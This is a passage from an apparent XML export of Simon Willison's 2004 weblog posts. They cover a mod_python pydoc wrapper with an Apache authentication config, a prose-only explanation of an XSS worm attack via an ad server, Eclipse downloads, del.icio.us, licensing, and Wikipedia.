		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I've &lt;a href=&quot;http://simon.incutio.com/archive/2004/03/23/pydoc&quot;&gt;written about pydoc&lt;/a&gt; before. In my opinion it's one of Python's best kept secrets: a way of instantly browsing the properties, methods and documentation strings of any module available to the Python environment. It can even run a local HTTP server to allow for easy browsing of available documentation.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;That's all well and good for code running on your local machine, but most developers won't want to run a Pydoc server on a remote machine. We ran in to this problem recently at work; we wanted to run Pydoc on our development server but didn't want it exposed to the world at large.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Initially we considered running the regular Pydoc server locally on some random port, blocking that port to external IPs with a firewall rule and then using Apache's &lt;a href=&quot;http://httpd.apache.org/docs-2.0/mod/mod_proxy.html&quot;&gt;mod_proxy&lt;/a&gt; to open it up to outside access in a controlled manner. The downside with this is that we would have to run a special process and a firewall rule just to enable a relatively minor function. Instead, I spent some time working through the &lt;samp&gt;pydoc.py&lt;/samp&gt; source code and came up with a &lt;a href=&quot;http://www.modpython.org/&quot;&gt;mod_python&lt;/a&gt; wrapper for the &lt;acronym title=&quot;HyperText Markup Langyage&quot;&gt;HTML&lt;/acronym&gt; documentation part of the module.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;&lt;a href=&quot;http://simon.incutio.com/code/python/modpydoc.py&quot;&gt;modpydoc.py&lt;/a&gt;&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;(Aside: Safari will try to render the above as &lt;acronym title=&quot;HyperText Markup Langyage&quot;&gt;HTML&lt;/acronym&gt;, even though the Content-Type header says &lt;samp&gt;text/plain&lt;/samp&gt;. This is because &lt;a href=&quot;http://diveintomark.org/archives/2004/08/13/safari-content-sniffing&quot; title=&quot;Content sniffing considered harmful&quot;&gt;Safari is brain-dead&lt;/a&gt; - it inherited this particular grotesqueness from Internet Explorer. I still use it though.)&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Since we were already running mod_python on our development server, adding this extra module required no extra server configuration or additional server processes. It also allowed us to tie authentication for the resulting Pydoc instance to our existing authentication database, using &lt;a href=&quot;http://www.giuseppetanzilli.it/mod_auth_pgsql/&quot;&gt;mod_auth_pgsql&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;For the inquisitive, here's a rough approximation of the relevant parts of our &lt;samp&gt;httpd.conf&lt;/samp&gt; file for that server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;apacheconf&quot;&gt;
LoadModule access_module modules/mod_access.so
LoadModule auth_module modules/mod_auth.so
LoadModule alias_module modules/mod_alias.so
LoadModule auth_pgsql_module modules/mod_auth_pgsql.so
LoadModule python_module modules/mod_python.so

RedirectMatch permanent /pydoc$ /pydoc/

&amp;lt;Location &quot;/pydoc/&quot;&amp;gt;
    SetHandler python-program
    PythonHandler utils.modpydoc
    PythonPath &quot;sys.path+['/path/to/our/codebase/']&quot;
    AuthName &quot;Code Browser&quot;
    AuthType basic
    Auth_PG_database ourdb
    Auth_PG_user dbuser
    Auth_PG_pwd_table users
    Auth_PG_uid_field username
    Auth_PG_pwd_field password_md5
    Auth_PG_pwd_whereclause &quot; AND can_browse_code = 't' &quot;
    Auth_PG_hash_type MD5
    require valid-user
&amp;lt;/Location&amp;gt;
&lt;/code&gt;&lt;/pre&gt;</field>
		<field name="created">2004-09-28 03:34:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1450</field>
		<field name="title">Back in England</field>
		<field name="slug">back</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;And I'm back.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;This is just a quicky because I'm paying five pounds an hour for 'net access in Starbucks. England isn't as wireless as I had hoped. I'm going to be mostly offline for the next few days getting my affairs in order and readapting to life this side of the pond.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;I've had a fantastic year and I'll be sure to write something up about it once I have access to a cheaper Internet connection.&lt;/p&gt;</field>
		<field name="created">2004-09-30 10:54:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1451</field>
		<field name="title">Keeping up appearances</field>
		<field name="slug">keeping</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Wow, I think this is the longest gap in my blogging since I started! I wish I could say I've been enjoying the sunshine or &lt;a href=&quot;http://diveintomark.org/archives/2004/10/18/exit&quot; title=&quot;Every exit&quot;&gt;taking up a new hobby&lt;/a&gt;, but the truth is that the weather's been horrible and I've just been run off my feet readjusting to life in England and at University.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;One thing I haven't been doing is reading blogs. My aggregator (currently the excellent &lt;a href=&quot;http://www.newsfirerss.com/&quot;&gt;NewsFire&lt;/a&gt;, although &lt;a href=&quot;http://ranchero.com/netnewswire/whatsnew/netnewswire20.php&quot; title=&quot;What&amp;apos;s New in NetNewsWire 2.0&quot;&gt;NetNewsWire 2.0&lt;/a&gt; could easily steal my affections) has been lying dormant, and aside from occasionally checking a few sites (congratulations Matt &lt;a href=&quot;http://photomatt.net/2004/10/28/press-and-cnet/&quot; title=&quot;Houston Press and CNET&quot;&gt;on the new job&lt;/a&gt;!) I've been reading more academic papers than weblogs. My final year project is tentatively titled &quot;Collaborative annotation of web resources&quot; and looks set to take up a big chunk of my time over the next six months or so.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;I certainly miss the information flood of blogging, but there's something very liberating about dipping in every now and then rather than following several hundred constant streams of consciousness, &lt;a href=&quot;http://www.kunal.org/scoble/&quot; title=&quot;Robert Scoble&amp;apos;s link blog&quot;&gt;Scoble style&lt;/a&gt;. I guess you could say I've been re-evaluating my priorities. I'll certainly be scaling back some commitments in the near future, though which ones and by how much I have yet to decide.&lt;/p&gt;</field>
		<field name="created">2004-10-29 11:41:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1452</field>
		<field name="title">Election endorsements</field>
		<field name="slug">endorsements</field>
		<field name="body">&lt;p&gt;My ex-colleague Jacob Kaplan-Moss has put together a &lt;a href=&quot;http://toys.jacobian.org/endorsements/&quot; title=&quot;Presidential Endorsements 2004&quot;&gt;fantastic site&lt;/a&gt; listing the presidential endorsements published by American newspapers in the run up to the election. I was looking for something like this just the other day so it was great to find the answer so close to home. I was depressed but not at all surprised to see my former employer &lt;a href=&quot;http://www.ljworld.com/section/editorials/story/185880&quot; title=&quot;LJWorld.com: Bush is best&quot;&gt;endorse Bush&lt;/a&gt;, but it's interesting to see that of the &lt;a href=&quot;http://toys.jacobian.org/endorsements/states.html&quot; title=&quot;Endorsement Breakdown by State&quot;&gt;four Kansan papers listed&lt;/a&gt; two endorsed Kerry, despite that state's &lt;a href=&quot;http://www.electoral-vote.com/states/kansas.html&quot; title=&quot;Kansas Polls from Electoral-Vote.com&quot;&gt;huge Republican majority&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2004-10-31 19:44:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1453</field>
		<field name="title">Let a thousand conspiracy theories bloom</field>
		<field name="slug">conspiracies</field>
		<field name="body">&lt;p&gt;I'm about to hit the sack, but &lt;a href=&quot;http://www.msnbc.msn.com/id/6363692/&quot; title=&quot;Bush close to victory with wins in Florida, Ohio&quot;&gt;current indications&lt;/a&gt; are that Bush has won Ohio by a couple of percentage points and thus has been re-elected as President of the United States.&lt;/p&gt;

&lt;p&gt;Ohio. Isn't that the state that Diebold president Walden O'Dell &lt;a href=&quot;http://www.commondreams.org/headlines03/0828-08.htm&quot; title=&quot; Voting Machine Controversy&quot;&gt;promised to deliver&lt;/a&gt; to the Republicans?&lt;/p&gt;

&lt;p&gt;I don't know if Ohio voters used Diebold machines. If they did, I'm certainly not about to say that the machines were fixed in any way. But the problem with voting machines without a paper trail is that there's no way anyone can be absolutely certain that the election wasn't stolen. In a modern democracy, that just ain't healthy.&lt;/p&gt;</field>
		<field name="created">2004-11-03 06:18:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1454</field>
		<field name="title">Open source license help needed</field>
		<field name="slug">licensing</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Every now and then, I get an e-mail asking me to clarify the license associated with code that I've posted on this site, such as my &lt;a href=&quot;http://simon.incutio.com/code/js/date-parser/&quot;&gt;date parsing script&lt;/a&gt;. I'm looking for an open source license that I can start slapping on things to ensure people that they can use it for whatever they want, but wading through the &lt;a href=&quot;http://www.opensource.org/licenses/&quot;&gt;list of licenses&lt;/a&gt; is no fun at all. Here are the features I'm looking for:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Minimal boiler-plate&lt;/strong&gt;. I don't want to have to copy and paste dozens of lines of legalese in to a 30 line long example script; my ideal license would allow me to &quot;link it in&quot; in a single line (&quot;(c) Simon Willison 2004, released under [X] license&quot;).&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Allows commercial use&lt;/strong&gt;. I don't care if people make money off something I've published here.&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Encourages attribution&lt;/strong&gt;. I don't want people feeling they have to credit me if they reuse five lines of Python I posted as an example somewhere, but I'm not averse to getting credited for more substantial contributions. I don't want to make attribution a requirement though as I'd rather people used my code and failed to attribute me than didn't use it at all.&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Is compatible with other licenses&lt;/strong&gt;. I often get asked if people can include my code in other open source projects - whatever license I use needs not to get in the way of other people's licensing aims for their own projects.&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-1&quot;&gt;I'm tempted to just slap a note saying &quot;this code is in the public domain&quot; on everything and have done, but I'm not sure if there are unpleasant side effects to doing so. The only thing I want to avoid is people explicitly claiming my work as their own.&lt;/p&gt;</field>
		<field name="created">2004-11-05 00:34:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1455</field>
		<field name="title">Usability blunders</field>
		<field name="slug">blunder</field>
		<field name="body">&lt;p&gt;I stumbled across this today and thought it was just too good not to share.&lt;/p&gt;

&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;Have you saved you work? If you with to go back and save your work, please click on the yes button and then go to page 4 of the Conclusion section. If you wish to exit, click on the no button.&quot; height=&quot;160&quot; src=&quot;http://simon.incutio.com/images/2004/blunder.gif&quot; width=&quot;347&quot; /&gt;&lt;/p&gt;</field>
		<field name="created">2004-11-11 13:59:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1456</field>
		<field name="title">Mumps!</field>
		<field name="slug">mumps</field>
		<field name="body">&lt;a href=&quot;http://simon.incutio.com/images/2004/cameraman.jpg&quot; title=&quot;View larger photo.&quot;&gt;&lt;img alt=&quot;The camera man wore a protective scarf.&quot; height=&quot;176&quot; src=&quot;http://simon.incutio.com/images/2004/cameraman_thumb.jpg&quot; style=&quot;float: left; margin-right: 0.5em;&quot; width=&quot;220&quot; /&gt;&lt;/a&gt;

&lt;p&gt;I've become yet another statistic in the &lt;a href=&quot;http://www.bath.ac.uk/internal/news/mumps04.htm&quot;&gt;Bath Mumps epidemic of 2004&lt;/a&gt;. I'm quarantined until next Monday, and this afternoon we had a camera crew from &lt;a href=&quot;http://www.itvregions.com/index.php?region=west&quot;&gt;ITV West&lt;/a&gt; come round to film some doom-and-gloom footage warning students to get vaccinated. Amusingly the camera man hadn't had &lt;a href=&quot;http://en.wikipedia.org/wiki/Mumps&quot;&gt;Mumps&lt;/a&gt; and &lt;a href=&quot;&quot;&gt;took suitable precautions&lt;/a&gt; to avoid infection. I'm told that the piece will go out on ITV news for the south west at 6pm this evening.&lt;/p&gt;</field>
		<field name="created">2004-11-15 14:02:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1457</field>
		<field name="title">The Register hit by XSS</field>
		<field name="slug">xss</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Here's a nasty one: popular tech news site &lt;a href=&quot;http://www.theregister.co.uk/&quot;&gt;The Register&lt;/a&gt; was hit on Saturday by &lt;a href=&quot;http://www.theregister.co.uk/2004/11/10/bofra_worm/&quot;&gt;the Bofra exploit&lt;/a&gt;, a nasty worm which uses an iframe vulnerability in (you guessed it) Internet Explorer to install nasty things on the victim's PC. Where it gets interesting is that the attack wasn't against the Register themselves; it came through their third party ad serving company, Falk AG.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;This is a classic example of a &lt;a href=&quot;http://en.wikipedia.org/wiki/XSS&quot;&gt;cross site scripting&lt;/a&gt; attack, in which malicious client-side code (usually JavaScript) is uwittingly served up by an otherwise innocent site. Usually, cross site scripting is caused by a badly written server-side application failing to properly escape data sent in a query string before displaying it on a page. This allows attackers to create links which, when followed, steal cookies or cause other nasty effects for the user following the link. Attacks on third parties with scripts served up on a target website's pages (ad serving companies are a classic example) are less common but much more damaging as the malicious code involved will be distributed to everyone who visits that site, whether they click on a hostile link or not.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;This problem isn't restricted to ad servers; any service where web pages point to a JavaScript file hosted on an external site are potentially at risk should the external site be compromised by crackers or abused by its legitimate owner.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;An aside: users of alternative browsers (&lt;a href=&quot;http://www.getfirefox.com/&quot;&gt;Get Firefox!&lt;/a&gt;), as well as those who had upgraded to Windows XP Service Pack 2, were unaffected.&lt;/p&gt;</field>
		<field name="created">2004-11-22 08:32:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1458</field>
		<field name="title">No EU Software Patents</field>
		<field name="slug">patents</field>
		<field name="body">&lt;blockquote cite=&quot;http://www.nosoftwarepatents.com/docs/041123(EN)PRac.pdf&quot;&gt;&lt;p&gt;&lt;em class=&quot;dateline&quot;&gt;Munich, Germany (23 November 2004)&lt;/em&gt;.  The three most famous European authors of open-source software have issued an appeal against software patents on NoSoftwarePatents.com.  Linus Torvalds (Linux), Michael Widenius (MySQL) and Rasmus Lerdorf (PHP) urge the EU Council, which will convene later in the week, not to adopt a draft directive on software patents that they consider &quot;deceptive, dangerous, and democratically illegitimate&quot;.  They also call on the Internet community to express solidarity by placing NoSoftwarePatents.com links and banners on many Web sites. &lt;/p&gt;&lt;/blockquote&gt;

&lt;a href=&quot;http://nosoftwarepatents.com/&quot;&gt;&lt;img alt=&quot;Defend the future! Europe&amp;apos;s better off without software patents. NoSoftwarePatents.com&quot; height=&quot;90&quot; src=&quot;http://simon.incutio.com/images/2004/nosoftwarepatents.jpg&quot; width=&quot;390&quot; /&gt;&lt;/a&gt;

&lt;p&gt;It would be nice if someone with some serious design credentials would knock up some more aesthetically pleasing banners.&lt;/p&gt;
</field>
		<field name="created">2004-11-23 14:26:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1459</field>
		<field name="title">Eclipse download hell</field>
		<field name="slug">eclipse</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;One of the many thing the Mozilla/Firefox team have got right is the fantastic ease with which the application can be downloaded. Visitors to &lt;a href=&quot;http://www.mozilla.org/&quot;&gt;www.mozilla.org&lt;/a&gt; are greeted with a nice big &quot;Free Download&quot; link, aimed straight at the version for their (automatically detected) operating system hosted on a mirror geographically close to their &lt;acronym title=&quot;Internet Protocol&quot;&gt;IP&lt;/acronym&gt; address. It's hard to think of any way they could improve on this.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Contrast the Firefox experience to that facing anyone who wishes to download the Eclipse &lt;acronym title=&quot;Integrated Development Environment&quot;&gt;IDE&lt;/acronym&gt;. By far the most common usage of Eclipse is as an intelligent Java development environment, but the front page of &lt;a href=&quot;http://www.eclipse.org/&quot;&gt;eclipse.org&lt;/a&gt; makes no mention of this, instead calling it &quot;a kind of universal tool platform - an open extensible IDE for anything and nothing in particular&quot; followed by a link to a white paper. If you wanted to be pedantic about Firefox you could call it a &quot;development platform for XUL-based web-centric applications&quot; (and maybe mention the embedded HTML parser in a foot-note) but doing so would be utterly counter-productive.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;So, on to the &lt;a href=&quot;http://www.eclipse.org/downloads/index.php&quot;&gt;downloads page&lt;/a&gt;, embedded in a late-90s era frameset (at least they have the decency to link to a new frameset for each page, thus keeping bookmarks functional). This is a list of mirrors, ordered alphabetically by the name of the company or organisation sponsoring the mirror with only the domain name of each site as an indication of its geographical location. The link to the infinitely more useful &lt;a href=&quot;http://www.eclipse.org/downloads/mirror.html&quot;&gt;geographical list&lt;/a&gt; is hidden at the bottom of the page.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;I'm in the UK, so I hit the link for the &lt;a href=&quot;http://www.mirrorservice.org/sites/download.eclipse.org/&quot;&gt;UK mirror service&lt;/a&gt;. I'm after the most recent stable release, which I happen to know is version 3.0.1. Here are my options:&lt;/p&gt;

&lt;img alt=&quot;List of directories with obscure names&quot; height=&quot;306&quot; src=&quot;http://simon.incutio.com/images/2004/eclipse-dirs.gif&quot; width=&quot;432&quot; /&gt;

&lt;p id=&quot;p-4&quot;&gt;I'm going to take an educated guess and go for &lt;samp&gt;R-3.0.1-200409161125&lt;/samp&gt; - after all, the R probably stands for &quot;release&quot;, it's got the version number in it and it was last modified on the 7th of November which sounds about right for a recent release. I'm now faced with a &lt;a href=&quot;http://www.mirrorservice.org/sites/download.eclipse.org/R-3.0.1-200409161125/&quot;&gt;list of files&lt;/a&gt; too long to show here, at least 7 of which have macosx-carbon in the filename. Here are the most likely contenders:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;samp&gt;eclipse-JDT-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt; - 13.9M&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;eclipse-JDT-SDK-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt; - 24.6M&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;eclipse-platform-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt; - 23.1M&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;eclipse-platform-SDK-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt; - 51.1M&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;eclipse-RCP-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt; - 4.5M&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;eclipse-RCP-SDK-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt; - 16.3M&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;eclipse-SDK-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt; - 80.8M&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-5&quot;&gt;I tried &lt;samp&gt;eclipse-platform-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt; first, which gave me the IDE but not the Java editing features that I was actually interested in. Next I tried &lt;samp&gt;eclipse-JDT-SDK-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt;, which gave me the plugins but not the actual application. It turns out that &lt;samp&gt;eclipse-SDK-3.0.1-macosx-carbon.tar.gz&lt;/samp&gt;, my third choice, was the one that I needed.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;I'm a huge fan of Eclipse: it makes Java development bearable (see &lt;a href=&quot;http://osteele.com/archives/2004/11/ides&quot;&gt;the IDE Divide&lt;/a&gt;) but installing it is such a pain I nearly gave up! A note to the Eclipse guys: please, &lt;em&gt;please&lt;/em&gt; take a look at how Firefox are distributing their application and see if you can apply some of the same techniques to Eclipse. Your users will thank you for it.&lt;/p&gt;</field>
		<field name="created">2004-11-27 22:44:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1460</field>
		<field name="title">Blogmarks on del.icio.us</field>
		<field name="slug">delicious</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I'm horribly ill again: having defeated the mumps I now seem to have come down with some kind of 'flu thing. Lovely. In between whinging about my state of health and watching episodes of Frasier I've been playing with &lt;a href=&quot;http://del.icio.us/&quot;&gt;del.icio.us&lt;/a&gt; as part of my research in to web annotation. The connection between the two isn't particularly strong but it's clear that something very exciting is happening over there.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;This evening I wrote a script to import &lt;a href=&quot;http://simon.incutio.com/blogmarks/&quot;&gt;my blogmarks&lt;/a&gt; in to del.icio.us. I don't plan to replace them with a feed from the site for a couple of reasons: firstly, I like to keep my data somewhere I control and secondly, del.icio.us doesn't support my &quot;via&quot; fields. I will however be adding tag support to my blogmarks and some kind of functionality to ensure that anything I post to them is added to del.icio.us as well.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;The problem I have now is that I've added &lt;a href=&quot;http://del.icio.us/simonw/blogmarks&quot;&gt;nearly 1200 untagged links&lt;/a&gt; to del.icio.us, and anyone who has played with the service for more than a few minutes knows that it's the tags that make it so much fun. Does anyone know of a good tool for bulk-tagging of items in del.icio.us? I've tried &lt;a href=&quot;http://www.scifihifi.com/cocoalicious/&quot;&gt;Cocoal.icio.us&lt;/a&gt; but unfortunately it only lets you assign tags to items one at a time; what I really want to do is run full text searches against my del.icio.us links and mass-apply tags to dozens of items at a time. If one doesn't exist I can always knock up a custom tool with the &lt;a href=&quot;http://del.icio.us/doc/api&quot;&gt;lovely API&lt;/a&gt; but I'd rather not duplicate the effort if I don't have to.&lt;/p&gt;</field>
		<field name="created">2004-12-02 00:13:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1461</field>
		<field name="title">Casting out getters and setters</field>
		<field name="slug">getters</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://dirtsimple.org/2004/12/python-is-not-java.html&quot;&gt;Python Is Not Java&lt;/a&gt; by Phillip J. Eby (via &lt;a href=&quot;http://www.nedbatchelder.com/blog/200412.html#e20041202T223025&quot;&gt;Ned&lt;/a&gt;) is the most useful article on programming I've read in ages. If you have any interest at all in either language, go and read it. It's all good, but the part that really struck a nerve for me was this:&lt;/p&gt;

&lt;blockquote cite=&quot;http://dirtsimple.org/2004/12/python-is-not-java.html&quot;&gt;&lt;p&gt;Getters and setters are evil. Evil, evil, I say! Python objects are not Java beans. Do not write getters and setters. This is what the 'property' built-in is for. And do not take that to mean that you should write getters and setters, and then wrap them in 'property'. That means that until you prove that you need anything more than a simple attribute access, don't write getters and setters. They are a waste of CPU time, but more important, they are a waste of programmer time. Not just for the people writing the code and tests, but for the people who have to read and understand them as well.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Writing getters and setters in Java has always bugged me, but I've never quite been able to articulate the reason until now. Python's &lt;a href=&quot;http://python.org/doc/2.2.3/whatsnew/sect-rellinks.html#SECTION000340000000000000000&quot;&gt;property  syntax&lt;/a&gt; (and Ruby's similar &lt;a href=&quot;http://www.rubycentral.com/book/tut_classes.html#S2&quot;&gt;attr_reader and attr_writer&lt;/a&gt; methods) are so much more elegant that writing those things by hand, or even auto-generating them with Eclipse, leaves a nasty taste in my mouth.&lt;/p&gt;</field>
		<field name="created">2004-12-03 15:52:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1462</field>
		<field name="title">Google Print</field>
		<field name="slug">googlePrint</field>
		<field name="body">&lt;p&gt;I'm probably late to the party on this one, but I just noticed that Google Print results are now &lt;a href=&quot;http://www.google.com/search?q=books+on+css&quot; title=&quot;Google Search: books on css&quot;&gt;included&lt;/a&gt; in any Google search that starts with &quot;books on&quot;. I can't say I like the lousy discoverability of the interface much - a search box at &lt;a href=&quot;http://print.google.com/&quot;&gt;print.google.com&lt;/a&gt; would be a welcome addition - but the results are pretty impressive. It's also a shame that they're using a nasty obfuscation technique to disable copying and printing (based on serving book pages up as background images), if only because it will fuel yet more questions from newbie web developers asking how to do exactly that. Still, with &lt;a href=&quot;http://www.sfgate.com/cgi-bin/article.cgi?f=/c/a/2004/12/14/BUGADABBS91.DTL&quot; title=&quot;Google, 5 big libraries team to offer books&quot;&gt;today's announcement&lt;/a&gt; that Google are to team up with five leading libraries to scan more books this service is going to get a whole lot more important over the next few years.&lt;/p&gt;</field>
		<field name="created">2004-12-14 15:44:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1463</field>
		<field name="title">A quote</field>
		<field name="slug">quote</field>
		<field name="body">&lt;blockquote cite=&quot;http://www.technologyreview.com/articles/05/01/issue/ferguson0105.asp?p=7&quot;&gt;&lt;p&gt;
Ramez Naam, group program manager for MSN Search, declined to say whether or not search functions would be integrated directly into Microsoft's Internet Explorer. But a Microsoft executive, who asked to remain unnamed, told me that his company had recently reconstituted its browser development organization. &quot;Microsoft effectively disbanded the Internet Explorer group after killing Netscape,&quot; he said. &quot;But recently, they realized that Firefox was starting to gain share and that browser enhancements would be useful in the search market.&quot;
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;From &lt;a href=&quot;http://www.technologyreview.com/articles/05/01/issue/ferguson0105.asp&quot;&gt;What's next for Google&lt;/a&gt;, by Charles H. Ferguson.&lt;/p&gt;</field>
		<field name="created">2004-12-16 15:57:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1464</field>
		<field name="title">Some notes on Wikipedia</field>
		<field name="slug">wikilove</field>
		<field name="body">&lt;p&gt;I've been driving myself crazy with coursework over the past couple of weeks, and since it's always good to have something to take your mind off things I've also been spending a fair amount of time lurking around the &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2004/08/31/Wikipedia&quot; title=&quot;Tim Bray, eloquent as always&quot;&gt;beautiful&lt;/a&gt; &lt;a href=&quot;http://en.wikipedia.org/&quot;&gt;Wikipedia&lt;/a&gt;. Here are a few things about Wikipedia you may have missed:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;It's not just Wikipedia any more; there's also &lt;a href=&quot;http://en.wiktionary.org/&quot;&gt;Wiktionary&lt;/a&gt; (a multi-lingual dictionary), &lt;a href=&quot;http://en.wikibooks.org/&quot;&gt;Wikibooks&lt;/a&gt; (developing open content books on various topics), &lt;a href=&quot;http://en.wikiquote.org/&quot;&gt;Wikiquote&lt;/a&gt; (quotations), &lt;a href=&quot;http://wikisource.org/wiki/Main_Page:English&quot;&gt;Wikisource&lt;/a&gt; (a repository of public domain source texts), &lt;a href=&quot;http://species.wikipedia.org/wiki/Main_Page&quot;&gt;Wikispecies&lt;/a&gt; (a biological species database), &lt;a href=&quot;http://commons.wikimedia.org/&quot;&gt;Wikicommons&lt;/a&gt; (free images and other media) and &lt;a href=&quot;http://en.wikinews.org/&quot;&gt;Wikinews&lt;/a&gt; (a new Wikipedia-style news site). Not to mention the huge numbers of projects &lt;a href=&quot;http://meta.wikimedia.org/wiki/Complete_list_of_Wikimedia_projects&quot; title=&quot;Complete list of Wikimedia projects&quot;&gt;in other languages&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;You can view live stat graphs of the &lt;a href=&quot;http://wikimedia.org/stats/live/index.org.wikimedia.all.squid.html&quot;&gt;Wikipedia squid cache servers&lt;/a&gt; and see an overview of the &lt;a href=&quot;http://zwinger.wikimedia.org/ganglia/&quot;&gt;status of all Wikipedia servers&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Last year's &lt;a href=&quot;http://wikimediafoundation.org/wiki/Fundraising&quot;&gt;drive for donations&lt;/a&gt; was mostly spent on new hardware, and &lt;a href=&quot;http://meta.wikimedia.org/wiki/Wikimedia_servers#Orders_and_detailed_hardware_descriptions&quot;&gt;a detailed list of hardware orders&lt;/a&gt; is available.&lt;/li&gt;
 &lt;li&gt;Wikipedia's awesome &lt;a href=&quot;http://meta.wikimedia.org/wiki/Help:Formula&quot; title=&quot;Help:Formula&quot;&gt;TeX engine&lt;/a&gt; for presenting mathematical formulae may soon be expanded to support rendering of musical scores, SVG graphics, chemical formulae and more, thanks to the brilliant &lt;a href=&quot;http://wikisophia.org/wiki/Wikitex&quot;&gt;Wikitex&lt;/a&gt; module for &lt;a href=&quot;http://wikipedia.sourceforge.net/&quot;&gt;MediaWiki&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Wikisource has a &lt;a href=&quot;http://wikisource.org/wiki/Author:H._P._Lovecraft&quot;&gt;bunch of stories&lt;/a&gt; by H. P. Lovecraft!&lt;/li&gt;
 &lt;li&gt;Wikipedia's &lt;a href=&quot;http://en.wikipedia.org/wiki/Periodic_table_%28standard%29&quot;&gt;Periodic table&lt;/a&gt; links to detailed descriptions of every single element.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://kohl.wikimedia.org/cgi-bin/rcdumper&quot;&gt;Live recent changes feed&lt;/a&gt; is a page that shows edits to Wikipedia &lt;em&gt;in real time&lt;/em&gt;. It works by keeping the HTTP connection to your browser open and sending updates packaged as JavaScript calls (I think this is the same trick used by &lt;a href=&quot;http://cgiirc.sourceforge.net/&quot;&gt;CGI:IRC&lt;/a&gt;).&lt;/li&gt;
 &lt;li&gt;The channel &lt;samp&gt;#enrc.wikipedia&lt;/samp&gt; on &lt;samp&gt;irc.freenode.net&lt;/samp&gt; carries a bot-produced live feed of recent changes to Wikipedia. Edits occur so frequently that the bot had to be split in to five to avoid being flooded off the channel!&lt;/li&gt;
 &lt;li&gt;Wikipedia has a huge &lt;a href=&quot;http://en.wikipedia.org/wiki/Wikipedia:Vandalism_in_progress&quot;&gt;vandalism problem&lt;/a&gt;, but malicious edits are cleared up so fast that you'd be hard pressed to spot it.&lt;/li&gt;
